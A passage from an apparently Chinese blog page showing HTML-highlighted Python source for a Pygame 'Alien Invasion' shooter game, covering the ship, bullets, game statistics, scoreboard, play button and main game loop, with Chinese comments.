self.rect.right &lt; self.screen_rect.right:            <span class="comment">#如果飞船向右移动没有超过边界，飞船就向右移动x（x大小根据设置里面的飞船速度）</span></span><br><span class="line">            self.x += self.settings.ship_speed</span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:                                                        <span class="comment">#如果飞船向左移动没有超过边界，飞船就向左移动x </span></span><br><span class="line">            self.x -= self.settings.ship_speed </span><br><span class="line">            self.rect.x = self.x                                                                                             <span class="comment">#更新飞船位置</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">center_ship</span>(<span class="params">self</span>):</span>                                                                                 <span class="comment">#将飞船居中</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                       <span class="comment">#定义飞船居中位置为屏幕下面底部中央</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                         <span class="comment">#更新飞船位置</span></span><br></pre></td></tr></table></figure><h1 id="bullet-py"><a href="#bullet-py" class="headerlink" title="bullet.py"></a>bullet.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params">Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                                                                   <span class="comment">#在舰船的当前位置创建一个子弹对象</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()                                                                                   <span class="comment">#继承</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.color = self.settings.bullet_color</span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.settings.bullet_width,self.settings.bullet_height)              <span class="comment">#创建一个子弹并放置在正确位置</span></span><br><span class="line">        self.rect.midtop = ai_game.ship.rect.midtop</span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)                                                                          <span class="comment">#存储子弹的位置</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                            <span class="comment">#更新子弹位置</span></span><br><span class="line">        self.y -= self.settings.bullet_speed</span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_bullet</span>(<span class="params">self</span>):</span>                                                                                   <span class="comment">#在屏幕上绘制子弹</span></span><br><span class="line">        pygame.draw.rect(self.screen, self.color, self.rect)</span><br></pre></td></tr></table></figure><h1 id="game-stats-py"><a href="#game-stats-py" class="headerlink" title="game_stats.py"></a>game_stats.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameStats</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;</span></span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.reset_stats()</span><br><span class="line">        self.game_active = <span class="literal">False</span>                                           <span class="comment">#自动开启游戏</span></span><br><span class="line">        self.high_score = <span class="number">0</span>       <span class="comment">#高分永远不要重置。</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_stats</span>(<span class="params">self</span>):</span>    <span class="comment">#初始化游戏数据</span></span><br><span class="line">        self.ships_left = self.settings.ship_limit</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.level = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="scoreboard-py"><a href="#scoreboard-py" class="headerlink" title="scoreboard.py"></a>scoreboard.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Group</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scoreboard</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                       <span class="comment">#初始化得分属性</span></span><br><span class="line">        self.ai_game = ai_game</span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        </span><br><span class="line">        self.stats = ai_game.stats                                      <span class="comment">#得分信息的字体设置</span></span><br><span class="line">        self.text_color = (<span class="number">30</span>, <span class="number">30</span>, <span class="number">30</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">        self.prep_score()                                                       <span class="comment">#初始乐谱图像</span></span><br><span class="line">        self.prep_high_score()</span><br><span class="line">        self.prep_level()</span><br><span class="line">        self.prep_ships()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;</span></span><br><span class="line">        rounded_score = <span class="built_in">round</span>(self.stats.score, -<span class="number">1</span>)</span><br><span class="line">        score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(rounded_score)</span><br><span class="line">        self.score_image = self.font.render(score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">        </span><br><span class="line">        self.score_rect = self.score_image.get_rect()               <span class="comment">#在屏幕右上方显示分数</span></span><br><span class="line">        self.score_rect.right = self.screen_rect.right - <span class="number">20</span></span><br><span class="line">        self.score_rect.top = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_high_score</span>(<span class="params">self</span>):</span>                                                     <span class="comment">#将高分转换为图像</span></span><br><span class="line">        high_score = <span class="built_in">round</span>(self.stats.high_score, -<span class="number">1</span>)</span><br><span class="line">        high_score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(high_score)</span><br><span class="line">        self.high_score_image = self.font.render(high_score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">            </span><br><span class="line">        self.high_score_rect = self.high_score_image.get_rect()          <span class="comment">#将高分居中显示在屏幕顶部</span></span><br><span class="line">        self.high_score_rect.centerx = self.screen_rect.centerx</span><br><span class="line">        self.high_score_rect.top = self.score_rect.top</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_level</span>(<span class="params">self</span>):</span>                                                                      <span class="comment">#将等级转换为渲染的图像。</span></span><br><span class="line">        level_str = <span class="built_in">str</span>(self.stats.level)</span><br><span class="line">        self.level_image = self.font.render(level_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">    </span><br><span class="line">        self.level_rect = self.level_image.get_rect()                 <span class="comment">#将级别定位在分数下方</span></span><br><span class="line">        self.level_rect.right = self.score_rect.right</span><br><span class="line">        self.level_rect.top = self.score_rect.bottom + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_ships</span>(<span class="params">self</span>):</span>                                                                 <span class="comment">#显示生命值</span></span><br><span class="line">        self.ships = Group()</span><br><span class="line">        <span class="keyword">for</span> ship_number <span class="keyword">in</span> <span class="built_in">range</span>(self.stats.ships_left):</span><br><span class="line">            ship = Ship(self.ai_game)</span><br><span class="line">            ship.rect.x = <span class="number">10</span> + ship_number * ship.rect.width</span><br><span class="line">            ship.rect.y = <span class="number">10</span></span><br><span class="line">            self.ships.add(ship)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_high_score</span>(<span class="params">self</span>):</span>                                               <span class="comment">#检查是否有新高分</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.score &gt; self.stats.high_score:</span><br><span class="line">            self.stats.high_score = self.stats.score</span><br><span class="line">            self.prep_high_score()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_score</span>(<span class="params">self</span>):</span>                                                            <span class="comment">#在屏幕上面绘制分数和其它信息</span></span><br><span class="line">        self.screen.blit(self.score_image, self.score_rect)</span><br><span class="line">        self.screen.blit(self.high_score_image, self.high_score_rect)</span><br><span class="line">        self.screen.blit(self.level_image, self.level_rect)</span><br><span class="line">        self.ships.draw(self.screen)</span><br></pre></td></tr></table></figure><h1 id="botto-py"><a href="#botto-py" class="headerlink" title="botto.py"></a>botto.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game, msg</span>):</span>                 <span class="comment">#初始化</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        </span><br><span class="line">        self.width, self.height = <span class="number">200</span>, <span class="number">50</span>               <span class="comment">#设置按钮的尺寸和属性</span></span><br><span class="line">        self.button_color = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">        self.text_color = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line">        </span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.width, self.height)    <span class="comment">#放置play图标</span></span><br><span class="line">        self.rect.center = self.screen_rect.center</span><br><span class="line">        </span><br><span class="line">        self._prep_msg(msg)                                  <span class="comment">#该按钮仅需准备一次</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_prep_msg</span>(<span class="params">self, msg</span>):</span>                              <span class="comment">#将其转换为渲染的图像，然后在按钮上居中显示文本。</span></span><br><span class="line">        self.msg_image = self.font.render(msg, <span class="literal">True</span>, self.text_color,</span><br><span class="line">                self.button_color)</span><br><span class="line">        self.msg_image_rect = self.msg_image.get_rect()</span><br><span class="line">        self.msg_image_rect.center = self.rect.center</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_button</span>(<span class="params">self</span>):</span>                                     <span class="comment">#在屏幕上面绘制</span></span><br><span class="line">        self.screen.fill(self.button_color, self.rect)</span><br><span class="line">        self.screen.blit(self.msg_image, self.msg_image_rect)</span><br></pre></td></tr></table></figure><h1 id="重构alien-invasion-py"><a href="#重构alien-invasion-py" class="headerlink" title="重构alien_invasion.py"></a>重构alien_invasion.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> game_stats <span class="keyword">import</span> GameStats</span><br><span class="line"><span class="keyword">from</span> scoreboard <span class="keyword">import</span> Scoreboard</span><br><span class="line"><span class="keyword">from</span> button <span class="keyword">import</span> Button</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">from</span> bullet <span class="keyword">import</span> Bullet</span><br><span class="line"><span class="keyword">from</span> alien <span class="keyword">import</span> Alien</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;管理游戏资源和行为的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化游戏并创建游戏资源&quot;&quot;&quot;</span></span><br><span class="line">        pygame.init()</span><br><span class="line">        self.settings = Settings()</span><br><span class="line"></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">0</span>, <span class="number">0</span>), pygame.FULLSCREEN)</span><br><span class="line">        self.settings.screen_width = self.screen.get_rect().width</span><br><span class="line">        self.settings.screen_height = self.screen.get_rect().height</span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建一个实例来存储游戏统计信息，并创建一个记分板。&quot;&quot;&quot;</span></span><br><span class="line">        self.stats = GameStats(self)</span><br><span class="line">        self.sb = Scoreboard(self)</span><br><span class="line"></span><br><span class="line">        self.ship = Ship(self)</span><br><span class="line">        self.bullets = pygame.sprite.Group()</span><br><span class="line">        self.aliens = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line">        self._create_fleet()</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;设置play&quot;&quot;&quot;</span></span><br><span class="line">        self.play_button = Button(self, <span class="string">&quot;Play&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;开启游戏并循环&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self._check_events()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.stats.game_active:</span><br><span class="line">                self.ship.update()</span><br><span class="line">                self._update_bullets()</span><br><span class="line">                self._update_aliens()</span><br><span class="line"></span><br><span class="line">            self._update_screen()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_events</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYDOWN:</span><br><span class="line">                self._check_keydown_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYUP:</span><br><span class="line">                self._check_keyup_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.MOUSEBUTTONDOWN:</span><br><span class="line">                mouse_pos = pygame.mouse.get_pos()</span><br><span class="line">                self._check_play_button(mouse_pos)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;当玩家单击播放时开始新游戏&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_play_button</span>(<span class="params">self, mouse_pos</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;</span></span><br><span class="line">        button_clicked = self.play_button.rect.collidepoint(mouse_pos)</span><br><span class="line">        <span class="keyword">if</span> button_clicked <span class="keyword">and</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            <span class="comment">#重置游戏设置</span></span><br><span class="line">            self.settings.initialize_dynamic_settings()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#重置游戏统计信息</span></span><br><span class="line">            self.stats.reset_stats()</span><br><span class="line">            self.stats.game_active = <span class="literal">True</span></span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.prep_level()</span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#摆脱任何剩余的外星人和子弹</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#建立一个新的舰队并集中舰船</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#隐藏鼠标光标</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keydown_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_q:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_SPACE:</span><br><span class="line">            self._fire_bullet()</span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keyup_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建一个新的项目符号并将其添加到项目符号组&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_fire_bullet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.bullets) &lt; self.settings.bullets_allowed:</span><br><span class="line">            new_bullet = Bullet(self)</span><br><span class="line">            self.bullets.add(new_bullet)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新项目符号的位置并摆脱旧项目符号&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_bullets</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 更新子弹位置</span></span><br><span class="line">        self.bullets.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 消除子弹</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.copy():</span><br><span class="line">            <span class="keyword">if</span> bullet.rect.bottom &lt;= <span class="number">0</span>:</span><br><span class="line">                 self.bullets.remove(bullet)</span><br><span class="line"></span><br><span class="line">        self._check_bullet_alien_collisions()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;子弹与外星人的碰撞&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_bullet_alien_collisions</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 消除被打到的子弹和外星人</span></span><br><span class="line">        collisions = pygame.sprite.groupcollide(</span><br><span class="line">                self.bullets, self.aliens, <span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> collisions:</span><br><span class="line">            <span class="keyword">for</span> aliens <span class="keyword">in</span> collisions.values():</span><br><span class="line">                self.stats.score += self.settings.alien_points * <span class="built_in">len</span>(aliens)</span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.check_high_score()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.aliens:</span><br><span class="line">            <span class="comment"># 销毁现有子弹并建立新的舰队</span></span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.settings.increase_speed()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Increase level.</span></span><br><span class="line">            self.stats.level += <span class="number">1</span></span><br><span class="line">            self.sb.prep_level()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查舰队是否处于边缘，然后更新舰队中所有外星人的位置。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_aliens</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._check_fleet_edges()</span><br><span class="line">        self.aliens.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 寻找与外星人的碰撞</span></span><br><span class="line">        <span class="keyword">if</span> pygame.sprite.spritecollideany(self.ship, self.aliens):</span><br><span class="line">            self._ship_hit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 寻找外星人撞到屏幕底部</span></span><br><span class="line">        self._check_aliens_bottom()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查是否有任何外星人到达屏幕底部&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_aliens_bottom</span>(<span 